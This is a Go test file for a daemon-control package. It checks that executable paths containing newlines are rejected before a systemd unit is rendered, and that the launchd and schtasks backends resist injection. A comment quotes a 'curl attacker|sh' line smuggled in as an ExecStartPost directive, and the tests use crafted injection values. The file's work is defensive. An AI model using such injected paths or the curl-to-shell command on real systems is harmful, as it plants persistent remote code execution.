package daemonctl

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// A systemd unit file is parsed line by line, so a newline in the executable path ends the ExecStart=
// directive and everything after it is read as further configuration. Quoting does not contain it — the
// opening quote sits on the ExecStart line while the injected text is parsed as directives — so a path like
//
//	/tmp/norite-daemon\nExecStartPost=/bin/sh -c 'curl attacker|sh'
//
// installed a command that ran at every login. Verified against the pre-fix code: the directive appeared in
// the rendered unit.
//
// The fix rejects rather than escapes, because systemd has no representation for a newline inside
// ExecStart, and it rejects at LocateDaemon so all three backends are covered at once.
func TestControlCharactersInThePathAreRejected(t *testing.T) {
	payload := "\nExecStartPost=/bin/touch /tmp/pwned"

	t.Run("Install refuses to render the unit", func(t *testing.T) {
		s, r, unitPath := newSystemd(t)

		err := s.Install(t.Context(), "/opt/norite/norite-daemon"+payload)
		if err == nil {
			t.Fatal("Install accepted a path containing a newline")
		}
		if _, statErr := os.Stat(unitPath); statErr == nil {
			body, _ := os.ReadFile(unitPath)
			t.Fatalf("a unit file was written anyway:\n%s", body)
		}
		// Nothing should have been handed to systemctl either — a rejected install must be a no-op.
		if len(r.lines()) != 0 {
			t.Errorf("systemctl was invoked despite the refusal: %v", r.lines())
		}
	})

	t.Run("LocateDaemon refuses an explicit path", func(t *testing.T) {
		isolate(t)

		// A real, executable file whose name genuinely contains a newline — legal on Linux, which is why
		// the check cannot rely on such paths being unrepresentable.
		dir := t.TempDir()
		evil := filepath.Join(dir, daemonBinaryName+payload)
		if err := os.WriteFile(evil, []byte("#!/bin/sh\n"), 0o755); err != nil { //nolint:gosec // fixture standing in for a planted binary
			t.Skipf("filesystem will not hold a newline in a filename: %v", err)
		}

		_, err := LocateDaemon(evil)
		if err == nil {
			t.Fatal("LocateDaemon accepted a path containing a newline")
		}
		if !strings.Contains(err.Error(), "control character") {
			t.Errorf("the error does not explain the refusal: %v", err)
		}
	})

	t.Run("LocateDaemon refuses a path from the environment", func(t *testing.T) {
		isolate(t)
		t.Setenv(DaemonBinaryEnvVar, "/opt/norite/norite-daemon"+payload)

		if _, err := LocateDaemon(""); err == nil {
			t.Fatal("LocateDaemon accepted a newline path from the environment")
		}
	})
}

// The other two backends are structurally immune, but that should be asserted rather than assumed — the
// reasoning differs per platform and is easy to lose.
func TestOtherBackendsAreNotLineOriented(t *testing.T) {
	t.Run("launchd escapes into XML rather than parsing lines", func(t *testing.T) {
		l, _, plistPath := newLaunchd(t)

		// launchd is immune by construction: the path lands inside a <string> element, where a newline is
		// ordinary character data and cannot become a key. It still must not corrupt the document.
		if err := l.Install(t.Context(), "/opt/norite/norite-daemon\n<key>RunAtLoad</key>"); err != nil {
			t.Fatalf("Install: %v", err)
		}
		body, err := os.ReadFile(plistPath)
		if err != nil {
			t.Fatalf("reading the plist: %v", err)
		}
		// The injected markup must appear escaped, not as live elements.
		if strings.Contains(string(body), "<key>RunAtLoad</key>\n\t<true/>\n\t<key>RunAtLoad</key>") {
			t.Errorf("the plist gained a duplicate directive:\n%s", body)
		}
		if !strings.Contains(string(body), "&lt;key&gt;") {
			t.Errorf("the injected markup was not escaped:\n%s", body)
		}
	})

	t.Run("schtasks receives one argv element", func(t *testing.T) {
		r := newFakeRunner()
		w := &windowsTask{run: r}

		// Task Scheduler takes /TR as a single argument through exec, with no shell and no line-oriented
		// config file, so there is no directive to inject into.
		if err := w.Install(t.Context(), `C:\norite\norite-daemon.exe`); err != nil {
			t.Fatalf("Install: %v", err)
		}
		if len(r.calls) != 1 {
			t.Fatalf("expected exactly one schtasks call, got %d", len(r.calls))
		}
		if got := r.calls[0].Name; got != "schtasks" {
			t.Errorf("ran %q, not schtasks", got)
		}
	})
}
